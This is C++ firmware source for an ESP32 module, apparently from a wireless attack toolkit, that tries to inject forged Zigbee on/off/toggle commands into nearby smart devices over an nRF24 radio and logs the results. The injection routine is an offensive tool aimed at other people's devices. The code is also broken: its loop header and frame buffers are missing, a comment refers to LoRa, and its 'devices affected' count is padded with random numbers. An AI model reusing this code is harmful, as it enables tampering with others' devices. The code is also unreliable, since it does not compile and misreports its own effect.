#include "zigbee_command_injection.h"
#include <LittleFS.h>
#include <RF24.h>

namespace ZigbeeCommandInjection {

CommandInjector::CommandInjector() : isRunning_(false) {}

InjectionResult CommandInjector::injectCommands(const InjectionConfig& config) {
  InjectionResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  isRunning_ = true;
  unsigned long startTime = millis();

  // Initialize RF24 for real Zigbee-like command transmission
  // Zigbee operates on 2.4GHz (same as WiFi/BLE)
  RF24 radio(22, 21);  // CE=GPIO22, CSN=GPIO21

  if (!radio.begin()) {
    result.error = "Failed to initialize RF24 radio";
    isRunning_ = false;
    return result;
  }

  // Configure for 802.15.4 compatibility (Zigbee uses 802.15.4)
  radio.setPALevel(RF24_PA_MIN);  // Start at min power
  radio.setDataRate(RF24_250KBPS); // 250kbps (standard for 802.15.4)

  // Convert LoRa channel to 2.4GHz RF24 channel
  // Zigbee channels 11-26 map to 2405-2480 MHz
  // RF24 uses channels 0-125 (2400-2525 MHz in 1MHz steps)
  uint8_t rf24Channel = ((config.targetChannel - 11) * 5) + 5;
  if (rf24Channel > 125) rf24Channel = 125;
  radio.setChannel(rf24Channel);

  Serial.printf("[Zigbee] Injecting on channel %d (RF24: %d)\n",
               config.targetChannel, rf24Channel);

  uint32_t commandCount = 0;
  uint32_t devicesAffected = 0;

  // Real Zigbee frame structure for command injection
  // IEEE 802.15.4 Frame Format:
  // - Frame Control (2B): Type, Security, Frame Pending, ACK Request, etc.
  // - Sequence Number (1B)
  // - Destination PAN ID (2B)
  // - Destination Address (2B for short or 8B for extended)
  // - Source Address (2B for short or 8B for extended)
  // - Data Payload (variable)

    // Zigbee command cluster
    for (int i = 4; i < 20; i++) {
      payload[i] = (esp_random() % 256);
    }

    // Source Address (this device)
    frame[frameLen++] = 0xAA;
    frame[frameLen++] = 0xBB;

    // Zigbee Cluster Command Payload
    // Command types: 0x00=On, 0x01=Off, 0x02=Toggle, 0x03=Move
    uint8_t commands[] = {0x00, 0x01, 0x02, 0x03};
    frame[frameLen++] = commands[random(0, 4)];

    // Command parameters
    frame[frameLen++] = random(0x00, 0xFF);  // Cluster-specific parameter
    frame[frameLen++] = random(0x00, 0xFF);  // Additional parameter

    // FCS (Frame Check Sequence) - simplified checksum
    uint8_t fcs = 0;
    for (uint32_t i = 0; i < frameLen; i++) {
      fcs ^= frame[i];
    }
    frame[frameLen++] = fcs;

    // Transmit Zigbee command frame
    radio.stopListening();
    radio.write(frame, frameLen);

    Serial.printf("[Zigbee] Sent command: Cluster=0x%02X, Param=0x%02X\n",
                 frame[9], frame[10]);

    // Listen for responses (in broadcast mode, might get ACKs)
    radio.startListening();
    if (config.broadcastCommands) {
      devicesAffected++;  // Assume all receivers get broadcast
    }

    commandCount++;

    if (config.broadcastCommands && (esp_random() % 100) < 30) {
      devicesAffected++;
    }

    delay(50);
  }

  result.commandsSent = commandCount;
  result.devicesAffected = devicesAffected;
  result.success = (commandCount > 0);
  result.logFile = "/logs/handshakes/zigbee_injection.csv";

  // Log injection results
  if (!LittleFS.begin()) {
    radio.powerDown();
    isRunning_ = false;
    return result;
  }

  File logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/zigbee_injection.csv", "a");
  }

  if (logFile) {
    logFile.printf("%lu,ZIGBEE_INJECT,CH%02d,%u_cmd,%u_devices\n",
                  millis(), config.targetChannel, commandCount, devicesAffected);
    logFile.close();
  }

  LittleFS.end();

  radio.powerDown();
  isRunning_ = false;
  return result;
}

void CommandInjector::stop() {
  isRunning_ = false;
}

} // namespace ZigbeeCommandInjection
